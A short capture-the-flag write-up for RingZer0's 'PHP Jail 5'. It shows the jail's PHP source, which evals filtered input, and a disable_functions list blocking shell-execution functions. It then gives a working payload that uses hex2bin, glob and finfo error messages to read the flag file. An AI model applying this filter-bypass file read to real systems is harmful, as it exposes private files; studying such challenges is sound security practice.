# **PHP Jail 5**

```shell=
ubuntu@ubuntu-virtual-machine:~$ ssh level5@challenges.ringzer0team.com -p 10227 

level5@challenges.ringzer0team.com's password: [PHP Jail 4 Flag]

RingZer0 Team Online CTF

PHP Jail Level 5:
Current user is uid=1004(level5) gid=1004(level5) groups=1004(level5)

Flag is located at /home/level5/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
	if(preg_match('/(\_|\'|\"|`|\.|\$|\/|a|c|s|z|require|include)/i', $var)) {
		return false;
	}
	return true;
}
if(filter($var)) {
	eval($var);
	echo "Command executed";
} else {
	echo "Restricted characters has been used";
}
echo "\n";
?>

-----------------------------
Your input:
```

Just like `PHP Jail 4`'s second method.

Using `hex2bin()` & `glob()` to create `flag.txt`.

Then I needed some function to read the contents from `flag.txt`.

And find a class with a constructor that takes a filename as an argument then make it return error message, `finfo()`.

```shell=
Your input:
new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
PHP Notice:  finfo::finfo(): Warning: offset `FLAG-XXXXXX' invalid in /home/level5/jail.php(14) : eval()'d code on line 1
PHP Notice:  finfo::finfo(): Warning: type `FLAG-XXXXXX' invalid in /home/level5/jail.php(14) : eval()'d code on line 1
PHP Warning:  finfo::finfo(): Failed to load magic database at '/home/level5/flag.txt'. in /home/level5/jail.php(14) : eval()'d code on line 1
Command executed
```